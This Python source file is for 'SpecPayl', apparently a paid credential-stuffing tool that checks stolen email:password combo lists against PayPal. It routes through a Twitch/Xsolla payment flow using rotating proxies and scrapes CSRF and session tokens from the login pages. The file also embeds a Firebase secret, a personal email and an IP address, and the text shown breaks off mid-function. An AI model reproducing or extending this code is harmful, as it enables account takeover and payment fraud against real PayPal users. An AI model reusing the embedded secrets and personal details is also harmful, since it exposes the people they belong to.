import os
from firebase import firebase
import requests, threading, time, random, ctypes, webbrowser,re, hashlib, datetime, os.path, tkinter, sys
import cloudscraper
from bs4 import BeautifulSoup
from colorama import Fore, init
from re import search
import datetime
from tkinter import filedialog, messagebox
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from colorama import init
from termcolor import colored
import subprocess
import warnings
import codecs
from urllib.parse import urlparse, parse_qs
import urllib.parse
import uuid
from fake_useragent import UserAgent
import hashlib
from firebase.firebase import FirebaseApplication
from firebase.firebase import FirebaseAuthentication
import keyboard
import urllib3
from multiprocessing.dummy import Pool as ThreadPool
import logging
from urllib.parse import unquote
import string
from my_fake_useragent import UserAgent
from discord_webhook import DiscordWebhook

#from seleniumwire import webdriver
warnings.filterwarnings("ignore")
e = datetime.datetime.now()
date1 = datetime.datetime.now()
current_date = e.strftime("%Y-%m-%d-%H-%M-%S")
url = "https://lokigamer00.pythonanywhere.com/spectre/"
content = {"module":"logo"}
loda = requests.post(url, json=content)
logoxd = loda.text
content = {"module":"flecha"}
loda = requests.post(url, json=content)
flecha = loda.text
logo = f"""{Fore.BLUE}                                   _____                   _____            _ 
                                  / ____|                 |  __ \          | |
                                 | (___  _ __   ___  ___  | |__) |_ _ _   _| |
                                  \___ \| '_ \ / _ \/ __| |  ___/ _` | | | | |
                                  ____) | |_) |  __/ (__  | |  | (_| | |_| | |
                                 |_____/| .__/ \___|\___| |_|   \__,_|\__, |_|
                                        | |                            __/ |  
                                        |_|                           |___/   
{Fore.CYAN}                                                    Dev by: IzLoki#5893"""
num2 = 0
keyword = ""
Chainer = "010x01x01001xx0x00x000x0x00100"
try:
    hwid = str(subprocess.check_output('wmic csproduct get uuid')).split(" ")[34][6:]
    #data = "Hwid = " + hwid + "\nIp = " + ip.text,
    #datatosend = "Hwid: " + hwid + "\nIp: " + ip.text
except Exception as e:
    print("Error on get hwid!")
    time.sleep(3)
    exit()
errorcapture, errorrank, runranked, noregion, riron, rbronze, rsilver, rgold, rplatinum, rdiamond, rinmortal, rradiant, s00, s1t10, s10t20, s20to30, s30to40, s40to50, sb50to100, s100to150, s150to200, s201 = 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
HYahoo, HAol, HAbv, HMail, HMicrosoft, UNCgmail, UNCyahoo, UNCaol, UNChotmail, UNCrediff = 0,0,0,0,0,0,0,0,0,0
hits, bads, free, checked, error, free2, free3, flagged, banned = 0,0,0,0,0,0,0,0,0
wbalance, b0to10, b10to50, b50to100, b100to500, b500to1000, b1000more, nocard, yescard, expires = 0,0,0,0,0,0,0,0,0,0
AuthCode = ""
cpm, nowcpm = 0,0
xddd, time2, xdd, time3, recapretrys = 0,0,0,0,0
NFA, SFA, OPTIFINE, DEMO = 0,0,0,0
useproxys, keyword = "", ""
ppsessid, ppaccestoken = "", ""
ctypes.windll.kernel32.SetConsoleTitleW("SpecPayl - UHQ | By: IzLoki#5893")
global emails, passwords
retry = 0
emails = []
passwords = []
proxylist = []
root = tkinter.Tk()
root.withdraw()     
def load_params():
    f = open("config.yml")
    params = {}
    for line in f:
        line = line.strip()
        key_value = line.split("*")
        if len(key_value) == 2:
            params[key_value[0].strip()] = key_value[1].strip()
    #print(params)
    #global threads, proxy_type, timeout
    threads = int(params["threads"])
    proxy_type = str(params["proxy_type"])
    GUIShowInvalids = str(params["GUIShowInvalids"])
    GUICensure = str(params["GUICensure"])
    return threads, proxy_type, GUIShowInvalids, GUICensure
    #print(proxy_type)
    #time.sleep(5)

def ossystem(key):
    if key == "them2023mh":
        while True:
            global AuthCode
            url = "https://lokigamer00.pythonanywhere.com/spectre/"
            content = {"module":"CheckCode","code":AuthCode}
            gsdoni = requests.post(url, json=content)
            if "1" in gsdoni:
                pass
            elif "0" in gsdoni:
                os._exit(0)
            time.sleep(5)
    else:
        os._exit(0)
def Theano(key):
    if key == "them2023mh":
        os.system("cls")
        print("\n" + logo)
        print()
        print(f"\033[1;36;40m  {flecha}  \033[1;30;40m[Select option]\n")
        print()
        print()
        print(f"\033[1;36;40m    {flecha}  \033[1;31;40m[1] \033[1;30;40mLogin")
        print(f"\033[1;36;40m    {flecha}  \033[1;31;40m[2] \033[1;30;40mRegister")
        print(f"\033[1;36;40m    {flecha}  \033[1;31;40m[3] \033[1;30;40mDiscord Server")
        print()
        print(f"\033[1;36;40m    {flecha}  \033[1;31;40m[X] \033[1;30;40mBack")
        print()
        print()
        select = input(f"\033[1;36;40m{flecha} \033[1;30;40mSelect: ")
        if select == "1":
            global AuthCode
            try:
                hwid = str(subprocess.check_output('wmic csproduct get uuid')).split(" ")[34][6:]
            except Exception as e:
                print("Error on get hwid!")
                print(e)
                time.sleep(3)
                os._exit(0)
            url = "https://lokigamer00.pythonanywhere.com/spectre/"
            content = {"module":"GetCode","HWID":hwid, "type":"SPY"}
            loda = requests.post(url, json=content)
            if "code" in loda.text:
                AuthCode = loda.text[loda.text.find("{\"code\":")+len("{\"code\":"):loda.text.rfind("}")]
                uuidran("them2023mh")
            elif "Invalid" in loda.text:
                print("invalid license")
                time.sleep(2)
                Theano("them2023mh")
            else:
                print("error")
                print(loda.text)
                time.sleep(2)
                Theano("them2023mh")
        elif select == "2":
            try:
                hwid = str(subprocess.check_output('wmic csproduct get uuid')).split(" ")[34][6:]
            except Exception as e:
                print("Error on get hwid!")
                print(e)
                time.sleep(3)
                exit()
            os.system("cls")
            print("\n" + logo)
            print()
            lc = input(f"\033[1;36;40m    {flecha}  \033[1;30;40mInsert License: ")
            if " " in lc or lc == "":
                print("The license cannot have spaces or cannot be empty")
                time.sleep(2)
                Theano("them2023mh")
            url = "https://lokigamer00.pythonanywhere.com/spectre/"
            content = {"module":"Register","HWID":hwid,"lc":lc, "type":"SPY"}
            sagkfji = requests.post(url, json=content)
            if sagkfji.text == "1":
                print("Sucess register HWID")
                time.sleep(2)
            else:
                print("Error invalid license")
                time.sleep(2)
            Theano("them2023mh")
        elif select == "3":
            os.system("cls")
            print("\n" + logo)
            print()
            print(f"\033[1;36;40m  {flecha}  \033[1;30;40m[Select option]\n")
            print()
            print()
            print(f"\033[1;36;40m    {flecha}  \033[1;31;40m[1] \033[1;30;40mBuy program here: https://discord.gg/Axw7pkT2xe")
            print(f"\033[1;36;40m    {flecha}  \033[1;31;40m[2] \033[1;30;40mMy discord is: IzLoki#5893")
            print()
            print(f"\033[1;36;40m    {flecha}  \033[1;31;40mPress X for back")
            while True:
                if keyboard.read_key() == "x":
                    break    
            Theano("them2023mh")
        else:
            Theano("them2023mh")
    else:
        os._exit(0)
def uuidran(key):
    if key == "them2023mh":
        global AuthCode
        try:
            hwid = str(subprocess.check_output('wmic csproduct get uuid')).split(" ")[34][6:]
        except Exception as e:
            print("Error on get hwid!")
            print(e)
            time.sleep(3)
            os._exit(0)
        url = "https://lokigamer00.pythonanywhere.com/spectre/"
        content = {"module":"GetCode","HWID":hwid, "type":"SPY"}
        loda = requests.post(url, json=content)
        if "code" in loda.text:
            AuthCode = loda.text[loda.text.find("{\"code\":")+len("{\"code\":"):loda.text.rfind("}")]
            pass
        elif "Invalid" in loda.text:
            print("invalid license")
            Theano("them2023mh")
        else:
            print("error")
            print(loda.text)
            time.sleep(3)
            os._exit(0)
        threading.Thread(target=ossystem, args=("them2023mh",)).start()
        print("sucess")
        os.system("cls")
        print("\n" + logo)
        print()
        print("Loading config..")
        #open("log.txt", "w")
        #try:
        f = open("config.yml", "a+")
        f.close()
        f = open("config.yml", "r")
        if (not f.read()):
            f = open("config.yml", "a")
            f.write("#This are configs from the checker! You can change the settings from here if you know what you are doing! Or simply change them from the program\n")
            f.write("#If for some reason you touched something that you should not simply delete the file and run the program again!\n")
            f.write("\nthreads * 200")
            f.write("\nproxy_type * http")
            f.write("\rGUIShowInvalids * OFF")
            f.write("\rGUICensure * OFF")
            f.close()
            load_params()
            Pipenv()
        else:
            load_params()
            threads, proxy_type, GUIShowInvalids, GUICensure=load_params()
            Pipenv()
    else:
        os._exit(0)




def PyBrain(key):
    if key == "them2023mh":
        global accounts
        loading = FirebaseAuthentication("yjlGVlJVXHT8J36wanqMYKlfOChuRi7ZpTtiOA1k", "juanitamorgade@gmail.com", True, True)
        loading2 = FirebaseApplication("https://spectre-cf776-default-rtdb.firebaseio.com/", loading)
        try:
            hwid = str(subprocess.check_output('wmic csproduct get uuid')).split(" ")[34][6:]
            #data = "Hwid = " + hwid + "\nIp = " + ip.text,
            #datatosend = "Hwid: " + hwid + "\nIp: " + ip.text
        except Exception as e:
            print("Fatal error")
            print(e)
            time.sleep(3)
            exit()
        result = loading2.get('SPY/users/', None)
        if not str(hwid) in str(result):
            time.sleep(2)
            close()
        else:
            pass
        os.system("cls")
        print(logo)
        ctypes.windll.kernel32.SetConsoleTitleW("SpecPayl - UHQ | By: IzLoki#5893")
        input(f"\033[1;36;40m  {flecha}  \033[1;30;40mPress ENTER to load combos")
        fileNameCombo = filedialog.askopenfile(parent=root, mode='rb', title='Choose a combo file',
        filetype=(("txt", "*.txt"), ("All files", "*.txt")))

        if fileNameCombo is None:
            os.system("cls")
            input("Please select valid combo file..")
            time.sleep(2)
            PyBrain("them2023mh")
        else:
            try:
                with open(fileNameCombo.name, 'r+', encoding='utf'.strip()) as e:
                    accounts = e.readlines()
                    accounts = [k.replace("\n", "") for k in accounts]
                print("  Loaded [{}] combos lines..".format(len(accounts)))
                time.sleep(2)
            except Exception as e:
                try:
                    with open(fileNameCombo.name, 'r+') as e:
                        accounts = e.readlines()
                        accounts = [k.replace("\n", "") for k in accounts]
                    print("  Loaded [{}] combos lines..".format(len(accounts)))
                    time.sleep(2)
                except Exception as e:
                    try:
                        with open(fileNameCombo.name, 'r+', encoding='cp850') as e:
                            accounts = e.readlines()
                            accounts = [k.replace("\n", "") for k in accounts]
                        print("  Loaded [{}] combos lines..".format(len(accounts)))
                        time.sleep(2)
                    except Exception as e:
                        print(e)
                        print("  Your combo file is probably harmed, please try again..")
                        time.sleep(2)
                        PyBrain("them2023mh")
    else:
        os._exit(0)
def messageboxer(key):
    if key == "them2023mh":
        global proxylist
        proxysx = FirebaseAuthentication("yjlGVlJVXHT8J36wanqMYKlfOChuRi7ZpTtiOA1k", "juanitamorgade@gmail.com", True, True)
        proxysx2 = FirebaseApplication("https://spectre-cf776-default-rtdb.firebaseio.com/", proxysx)
        try:
            hwid = str(subprocess.check_output('wmic csproduct get uuid')).split(" ")[34][6:]
        except Exception as e:
            print("Fatal error")
            print(e)
            time.sleep(3)
            exit()
        os.system('cls')
        print("\n" + logo + "\n")
        input(f"\033[1;36;40m  {flecha}  \033[1;30;40mPress ENTER to load proxys")
        fileNameProxy = filedialog.askopenfile(parent=root, mode='rb', title='Choose a proxy file',
        filetype=(("txt", "*.txt"), ("All files", "*.txt")))
        if fileNameProxy is None:
            print()
            print("  Please select valid proxy file..")
            time.sleep(2)
            PyBrain("them2023mh")
        else:
            try:
                with open(fileNameProxy.name, 'r+', encoding='utf-8', errors='ignore') as e:
                    ext = e.readlines()
                    for line in ext:
                        try:
                            proxyline = line.split()[0].replace('\n', '')
                            proxylist.append(proxyline)
                        except:
                            pass
                print("  Loaded [{}] proxies lines..".format(len(proxylist)))
                return
            except Exception as e:
                print("  Your proxy file is probably harmed, please try again..")
                messageboxer("them2023mh")
    else:
        os._exit(0)
def options():
    try:
        threads, proxy_type, GUIShowInvalids, GUICensure=load_params()
    except Exception as e:
        print(e)
        time.sleep(2)
    os.system("cls")
    print("\n" + logo)
    print(f"\033[1;36;40m  {flecha}  \033[1;30;40m[Select option]\n")
    print()
    print()
    try:
        print(f"\033[1;36;40m    {flecha}  \033[1;31;40m[1] \033[1;30;40mChange Threads [\033[1;32;30m"+ str(threads) +"]")
        print(f"\033[1;36;40m    {flecha}  \033[1;31;40m[2] \033[1;30;40mChange Proxy Type [\033[1;32;30m"+ str(proxy_type) +"\033[1;30;40m]")
        print(f"\033[1;36;40m    {flecha}  \033[1;31;40m[3] \033[1;30;40mChange GUI options")
    except Exception as e:
        print(e)
        time.sleep(4)
    print()
    print()
    print(f"\033[1;36;40m    {flecha}  \033[1;31;40m[X] \033[1;30;40mBack")
    print()
    print()
    selectedC = input(f"\033[1;36;40m{flecha} \033[1;30;40mSelect: ")
    if selectedC == "1":
        os.system("cls")
        print("\n" + logo)
        print()
        print(f"\033[1;36;40m  {flecha}  \033[1;30;40mHow much Threads do u want?\n")
        print()
        print()
        try:
            threadsAmount = int(input(f"\033[1;36;40m{flecha} \033[1;30;40mInsert: "))
        except:
            os.system("cls")
            print(f"\033[1;36;40m  {flecha}  \033[1;30;40mInsert valid input!\n")
            time.sleep(3)
            options()
        else:
            try:
                f = open("config.yml", "r")
                listL = f.readlines()
                listL[3] = "threads * "+ str(threadsAmount) + "\n"
            
                f = open("config.yml", "w")
                f.writelines(listL)
                f.close()
                print("Saving..")
                #load_params()
                time.sleep(1)
                options()
            except Exception as e:
                print(f"\033[1;36;40m  {flecha}  \033[1;30;40mError ocurred, saving in log.\n")
                """f = open("log.txt", "w")
                f.write(str(e))"""
                open("log.txt", 'a+').write("{}\n".format(e))
                #f.close()
                #print(e)
                time.sleep(4)
                options()
    elif selectedC == "2":
        try:
            f = open("config.yml", "r")
            listL = f.readlines()
        except Exception as e:
            print(f"\033[1;36;40m  {flecha}  \033[1;30;40mError ocurred, saving in log..\n")
            """f = open("log.txt", "w")
            f.write(str(e))"""
            #open("log.txt", 'a+').write("{}\n".format(e))
            #f.close()
            #print(e)
            time.sleep(4)
        os.system("cls")
        print("\n" + logo)
        print()
        print(f"\033[1;36;40m  {flecha}  \033[1;30;40mWhat proxy types do u want use?\n")
        print()
        print(f"\033[1;36;40m    {flecha}  \033[1;31;40m[1] \033[1;30;40mHttp/Https || \033[1;31;40m[2] \033[1;30;40mSocks4 || \033[1;31;40m[3] \033[1;30;40mSocks5 || \033[1;31;40m[4] \033[1;30;40mProxyLess")
        print()
        print("\033[1;31;40m    !!! \033[1;30;40mProxyLess only can check 5 accounts per hour \033[1;31;40m!!!\n")
        print()
        try:
            proxyT = int(input(f"\033[1;36;40m{flecha} \033[1;30;40mSelect: "))
        except:
            os.system("cls")
            print(f"\033[1;36;40m  {flecha}  \033[1;30;40mInsert valid input!\n")
            time.sleep(1)
            options()
        if proxyT == 1:
            listL[4] = "proxy_type * http\n"
            f = open("config.yml", "w")
            f.writelines(listL)
            f.close()
            print("Saving..")
            time.sleep(1)
            options()
        elif proxyT == 2:
            listL[4] = "proxy_type * socks4\n"
            f = open("config.yml", "w")
            f.writelines(listL)
            f.close()
            print("Saving..")
            time.sleep(1)
            options()
        elif proxyT == 3:
            listL[4] = "proxy_type * socks5\n"
            f = open("config.yml", "w")
            f.writelines(listL)
            f.close()
            print("Saving..")
            time.sleep(1)
            options()
        elif proxyT == 4:
            listL[4] = "proxy_type * null\n"
            f = open("config.yml", "w")
            f.writelines(listL)
            f.close()
            print("Saving..")
            time.sleep(1)
            options()
    elif selectedC == "3":
        while True:
            os.system("cls")
            print("\n" + logo)
            print()
            print(f"\033[1;36;40m  {flecha}  \033[1;30;40m[Select GUI Options]\n")
            print()
            print()
            print(f"\033[1;36;40m  {flecha}  \033[1;31;40m[1] \033[1;30;40mPrint invalids accounts [{GUIShowInvalids}]")
            print(f"\033[1;36;40m  {flecha}  \033[1;31;40m[2] \033[1;30;40mCensure valids/2FA accounts [{GUICensure}]\n")
            print()
            print()
            print(f"\033[1;36;40m    {flecha}  \033[1;31;40m[X] \033[1;30;40mBack")
            print()
            print()
            selectedC = input(f"\033[1;36;40m{flecha} \033[1;30;40mSelect: ")
            f = open("config.yml", "r")
            listL = f.readlines()
            if selectedC == "1":
                if "OFF" in GUIShowInvalids:
                    listL[5] = "GUIShowInvalids * ON\n"
                else:
                    listL[5] = "GUIShowInvalids * OFF\n"
                f = open("config.yml", "w")
                f.writelines(listL)
                f.close()
                print("Saving..")
                time.sleep(1)
                options()
            elif selectedC == "2":
                if "OFF" in GUIShowInvalids:
                    listL[6] = "GUICensure * ON\n"
                else:
                    listL[6] = "GUICensure * OFF\n"
                f = open("config.yml", "w")
                f.writelines(listL)
                f.close()
                print("Saving..")
                time.sleep(1)
                options()
            elif "x" in selectedC or "X" in selectedC:
                options()
            else:
                continue
    elif selectedC == "X" or selectedC == "x":
        Pipenv()
    else:
        options()


def chomp(x):
    if x.endswith("\r\n"):
        return x[:-2]
    if x.endswith("\n") or x.endswith("\r"):
        return x[:-1]
    return x



def oldPaypalCap1(accounts):
    global hits, bads, free, checked, error, cpm, num2, flagged, wbalance, b0to10, b10to50, b50to100, b100to500, b500to1000, b1000more, nocard, yescard
    recapretrys = 0
    elseretrys = 0
    sess = requests.session()
    global proxylist, retry
    threads, proxy_type, GUIShowInvalids, GUICensure=load_params()
    Check = True
    try:
        email = accounts.split(":")[0]
        password = accounts.split(":")[1]
    except Exception as e:
        print("Error parsing email or password")
        bads+=1
        checked+=1
        Check = False
    if Check:
        while True:
            try:
                threads, proxy_type, GUIShowInvalids, GUICensure=load_params()
                if proxy_type == "http":
                    scheme = "http"
                elif proxy_type == "socks4":
                    scheme = "socks4"
                elif proxy_type == "socks5":
                    scheme = "socks5"
                if not "null" in proxy_type:
                    proxy = random.choice(proxylist)
                    count = proxy.count(":")
                    if count == 3:
                        ip = proxy.split(":")[0]
                        port = proxy.split(":")[1]
                        user = proxy.split(":")[2]
                        passw = proxy.split(":")[3]
                        proxy = f"{user}:{passw}@{ip}:{port}"
                    proxy_form = {'http': f"{scheme}://{proxy}", 'https': f"{scheme}://{proxy}"}
                else:
                    pass
                sess.cookies.clear()
                US = urllib.parse.quote(email)
                PS = urllib.parse.quote(password)
                url = "https://secure.xsolla.com/paystation2/api/directpayment?pid=24"
                content = f"access_token=tlpsbrYppQyYuQlQMoIYwUQBJXck82Co_es_twitch-dark&pid=24&xps_description=&xps_sum=1.4&xps_out=&xps_pricepoints=&xps_locale=es&xps_ip=&xps_savePsAccountOnly=&xps_paymentWithSavedMethod=0&xps_userInitialCurrency=USD&xps_mobile=&xps_firstForm=1&xps_ps_custom_data=%7B%22cd20%22%3A%22savedmethod%22%7D&xps_dfp=&xps_purchaseDescription=100%20Bits%20(x%201)&xps_outCheckType=equals&xps_projectAmountCheckType=equals&xps_paymentType=currency&xps_sms=%0A%09%09%09%09%0A%09%09%09%09%0A%09%09%09&xps_ga_client_id=1225479004.1651985386&xps_fixedContrId=&xps_browserCountry=ES&xps_bonusOut=0&xps_idUserSession=225c5ea64e584ba77af5b5141b64a0af293c5924&xps_fix_command=checkout&xps_fix_currency=USD&xps_fix_email=lokigamer06%40gmail.com&xps_fix_externalTaxCoverage=1&xps_fix_foreignRequest=a%3A31%3A%7Bs%3A8%3A%22platform%22%3Bs%3A3%3A%22web%22%3Bs%3A9%3A%22device_id%22%3Bs%3A32%3A%22kI6ZVEykL1JJcXWDRffvnwO2mHEvSu9Z%22%3Bs%3A7%3A%22is_gift%22%3Bs%3A1%3A%220%22%3Bs%3A18%3A%22mystery_gift_count%22%3Bs%3A1%3A%220%22%3Bs%3A12%3A%22recipient_id%22%3Bs%3A1%3A%220%22%3Bs%3A17%3A%22ticket_product_id%22%3Bs%3A10%3A%22B017L2UX4C%22%3Bs%3A17%3A%22adjustment_amount%22%3Bs%3A0%3A%22%22%3Bs%3A12%3A%22product_type%22%3Bs%3A4%3A%22bits%22%3Bs%3A10%3A%22product_id%22%3Bs%3A10%3A%22B017L2UX4C%22%3Bs%3A8%3A%22quantity%22%3Bs%3A1%3A%221%22%3Bs%3A10%3A%22pricing_id%22%3Bs%3A36%3A%22246b78a1-8e90-4667-a948-84f75c796eda%22%3Bs%3A18%3A%22price_country_code%22%3Bs%3A2%3A%22AR%22%3Bs%3A18%3A%22fraud_product_size%22%3Bs%3A3%3A%22100%22%3Bs%3A22%3A%22fraud_product_quantity%22%3Bs%3A1%3A%221%22%3Bs%3A22%3A%22localstorage_device_id%22%3Bs%3A16%3A%22ac24b3716fc39c90%22%3Bs%3A14%3A%22tab_session_id%22%3Bs%3A16%3A%22e5431aaae8880bf5%22%3Bs%3A15%3A%22page_session_id%22%3Bs%3A16%3A%224a7ef3d44f101eac%22%3Bs%3A19%3A%22checkout_session_id%22%3Bs%3A36%3A%2213828c46-7ecf-4fc8-bdae-64460b069b69%22%3Bs%3A18%3A%22session_ip_address%22%3Bs%3A14%3A%22186.125.24.227%22%3Bs%3A20%3A%22session_country_code%22%3Bs%3A2%3A%22AR%22%3Bs%3A12%3A%22session_city%22%3Bs%3A16%3A%22Villa%20Carlos%20Paz%22%3Bs%3A19%3A%22session_postal_code%22%3Bs%3A4%3A%225152%22%3Bs%3A20%3A%22session_is_anonymous%22%3Bs%3A0%3A%22%22%3Bs%3A14%3A%22use_new_schema%22%3Bs%3A4%3A%22true%22%3Bs%3A7%3A%22is_anon%22%3Bs%3A1%3A%220%22%3Bs%3A8%3A%22sub_type%22%3Bs%3A16%3A%22DEFAULT_PURCHASE%22%3Bs%3A22%3A%22gift_to_sub_trial_days%22%3Bs%3A1%3A%220%22%3Bs%3A22%3A%22gift_to_sub_conversion%22%3Bs%3A0%3A%22%22%3Bs%3A5%3A%22offer%22%3Bs%3A1023%3A%22%7B%22ID%22%3A%22amzn1.twitch.commerce.offer.19b765be-8ca7-4646-94d0-1547f833c3d8%22%2C%22TplrData%22%3A%7B%22ID%22%3A%22amzn1.twitch.commerce.tplr.48801e7c-57b2-48ba-bb1a-d84048edb7d9%22%2C%22Name%22%3A%22bits_bundle%22%2C%22Tenant%22%3A%22bits%22%2C%22EligibilityUri%22%3A%22https%3A%2F%2Fus-west-2.prod.twitchpayday.twitch.a2z.com%22%2C%22FulfillmentUri%22%3A%22https%3A%2F%2Fus-west-2.prod.twitchpayday.twitch.a2z.com%22%2C%22RevocationUri%22%3A%22https%3A%2F%2Fus-west-2.prod.twitchpayday.twitch.a2z.com%22%2C%22MetadataUri%22%3A%22https%3A%2F%2Fus-west-2.prod.twitchpayday.twitch.a2z.com%22%2C%22VariableTags%22%3Anull%2C%22StaticTags%22%3A%5B%22product_id%22%5D%7D%2C%22Listing%22%3A%7B%22ChargeModel%22%3A%7B%22IsRecurring%22%3Afalse%2C%22PriceId%22%3A%22246b78a1-8e90-4667-a948-84f75c796eda%22%2C%22External%22%3Anull%2C%22Credit%22%3Anull%2C%22Interval%22%3Anull%2C%22RenewalPolicy%22%3A0%2C%22Id%22%3A%22amzn1.twitch.payments.charge_model.2893f657-6ac9-4bd7-ac27-b6826ac4abcc%22%7D%2C%22CancellationPolicy%22%3A%7B%22Type%22%3A0%7D%7D%2C%22TagBindings%22%3A%7B%22product_id%22%3A%22B017L2UX4C%22%7D%2C%22Platform%22%3A1%2C%22Promotion%22%3Anull%2C%22StartTime%22%3A%222019-09-10T22%3A37%3A57.175165Z%22%2C%22EndTime%22%3A%7B%22Time%22%3Anull%2C%22IsInfinite%22%3Atrue%7D%2C%22GiftProperties%22%3Anull%2C%22Quantity%22%3A%7B%22Min%22%3A1%2C%22Max%22%3A10%7D%2C%22EligibleCountries%22%3Anull%7D%22%3Bs%3A13%3A%22benefit_start%22%3Bs%3A0%3A%22%22%3Bs%3A11%3A%22benefit_end%22%3Bs%3A0%3A%22%22%3B%7D&xps_fix_pid=24&xps_fix_project=42097&xps_fix_projectAmount=1.4&xps_fix_projectCurrency=USD&xps_fix_refer=3&xps_fix_returnUrl=https%3A%2F%2Fsecure.xsolla.com%2Fpaystation3%2Freturn%2F%3Faccess_token%3DtlpsbrYppQyYuQlQMoIYwUQBJXck82Co_es_twitch-dark%26preferences%3DeyJpdGVtUHJvbW90aW9ucyI6IltdIn0-%26sessional%3DeyJoaXN0b3J5IjpbWyJzYXZlZG1ldGhvZCJdLFsibGlzdCIsdHJ1ZV1dfQ--&xps_fix_signed_params=project%2Ccountry%2Ccurrency%2Cv1%2Cv2%2CisXsollaLoginAuth%2CprojectAmount%2CprojectCurrency&xps_fix_userip=186.125.24.227&xps_fix_v1=654767682&xps_fix_v2=izloki&xps_fix_id_package=&xps_fix_out_stored=&xps_fix_currency_stored=USD&xps_fix_projectAmount_stored=1.4&xps_fix_originalOut=0&xps_fix_originalProjectAmount=1.4&xps_fix_isPsPayout=1&xps_fix_idPsAccount=20&xps_fix_purchaseAmount=&xps_fix_isFixedPay=1&xps_fix_externalVatCoverage=&xps_fix_xsollaProductTag=&xps_signature=9664429eac26a44282e96f86a8aae65a&xps_fixed=command%2Ccurrency%2Cemail%2CexternalTaxCoverage%2CforeignRequest%2Cpid%2Cproject%2CprojectAmount%2CprojectCurrency%2Crefer%2CreturnUrl%2Csigned_params%2Cuserip%2Cv1%2Cv2%2Cproject%2Ccommand%2Cpid%2Cuserip%2Cid_package%2Cout_stored%2Ccurrency_stored%2CprojectAmount_stored%2CoriginalOut%2CoriginalProjectAmount%2CisPsPayout%2CidPsAccount%2CpurchaseAmount%2CisFixedPay%2CexternalVatCoverage%2CexternalTaxCoverage%2CxsollaProductTag%2Cproject%2Ccurrency%2Cv1%2Cv2%2CprojectAmount%2CprojectCurrency&xps_braintree_device_data=&xps_dfp_hash=%7B%22200%22%3A%22268ed98e738802106e7aa2214e5d3fd45673094a%22%7D&paymentWithSavedMethod=0&user_session_id=225c5ea64e584ba77af5b5141b64a0af293c5924&ga_client_id=1225479004.1651985386&ps_custom_data=%7B%22cd20%22%3A%22savedmethod%22%7D&browserInfo=%7B%22name%22%3A%22Chrome%22%2C%22chrome%22%3Atrue%2C%22version%22%3A%22105.0%22%2C%22blink%22%3Atrue%2C%22windows%22%3Atrue%2C%22ui_version%22%3A%22desktop%22%7D&os=Windows%2010"
                header = {
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36",
                "Accept": None,
                "Sec-GPC": "1",
                "Accept-Language": "en-EN,en;q=0.7",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Dest": "document",
                "Referer": "https://secure.xsolla.com/paystation3/desktop/payment/?access_token=tlpsbrYppQyYuQlQMoIYwUQBJXck82Co_es_twitch-dark&additional=eyJwaWQiOjI0fQ--&preferences=eyJpdGVtUHJvbW90aW9ucyI6IltdIn0-&sessional=eyJoaXN0b3J5IjpbWyJzYXZlZG1ldGhvZCJdLFsibGlzdCIsdHJ1ZV0sWyJwYXltZW50Iix0cnVlLHsicGlkIjoyNH1dXX0-",
                "Accept-Encoding": None,
                "Content-Type": "application/x-www-form-urlencoded"
                }
                r2 = sess.post(url, headers=header, data=content, proxies=proxy_form)
                sign = r2.text[r2.text.find('{"sign":"')+len('{"sign":"'):r2.text.rfind('","url":"')]
                urldat = r2.text[r2.text.find('","url":"')+len('","url":"'):r2.text.rfind('"}},"checkoutToken"')]
                urldat = urllib.parse.quote(urldat)
                sign = urllib.parse.quote(sign)
                url = f"https://secure.xsolla.com/pages/redirect?sign={sign}&url={urldat}"
                header = {
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                    "Sec-GPC": "1",
                    "Accept-Language": "en-EN,en;q=0.7",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Dest": "document",
                    "Referer": "https://secure.xsolla.com/paystation3/desktop/payment/?access_token=tlpsbrYppQyYuQlQMoIYwUQBJXck82Co_es_twitch-dark&additional=eyJwaWQiOjI0fQ--&preferences=eyJpdGVtUHJvbW90aW9ucyI6IltdIn0-&sessional=eyJoaXN0b3J5IjpbWyJzYXZlZG1ldGhvZCJdLFsibGlzdCIsdHJ1ZV0sWyJwYXltZW50Iix0cnVlLHsicGlkIjoyNH1dXX0-",
                    "Accept-Encoding": None
                }
                while True:
                    r2 = sess.get(url, proxies=proxy_form, headers=header)
                    if not "name=\"_csrf\" value=\"" in r2.text:
                        error+=1
                        sess.close()
                        continue
                    else:
                        break
                two = r2.text[r2.text.find(".</p></div><form action=\"")+len(".</p></div><form action=\""):r2.text.rfind('" method="post" class="')]
                csrf = r2.text[r2.text.find("name=\"_csrf\" value=\"")+len("name=\"_csrf\" value=\""):r2.text.rfind('"><input type="hidden" id="session" name="_sessio')]
                csrf = urllib.parse.quote(csrf)

                sessid = r2.text[r2.text.find('sessionID" value="')+len('sessionID" value="'):r2.text.rfind('"><input type="hidden" name="locale.')]
                sessid = urllib.parse.quote(sessid)

                flowId = r2.text[r2.text.find('name="flowId" value="')+len('name="flowId" value="'):r2.text.rfind('" /><input type="hidden" name="ads-client-context-dat')]
                five = r2.text[r2.text.find('name="ads-client-context-data" value="')+len('name="ads-client-context-data" value="'):r2.text.rfind('" /><input type="hidden" name="ctxId')]
                ADS = urllib.parse.quote(five)
                CTXID = r2.text[r2.text.find('type="hidden" name="ctxId" value="')+len('type="hidden" name="ctxId" value="'):r2.text.rfind('" /><input type="hidden" name="isValidC')]
                if "[endif]--" in two:
                    two = r2.text[r2.text.find('<a class=" scTrack:unifiedlogin-footer-language_en_US" href="')+len('<a class=" scTrack:unifiedlogin-footer-language_en_US" href="'):r2.text.rfind('"  lang="en" data-locale="en_US"')]
                    if "><" in two:
                        two = r2.text[r2.text.find('<input type="hidden" name="requestUrl" value="')+len('<input type="hidden" name="requestUrl" value="'):r2.text.rfind('" /><input type="hidden" name="forcePhoneP')]
                        two = two[:two.rfind(";locale.x=")]
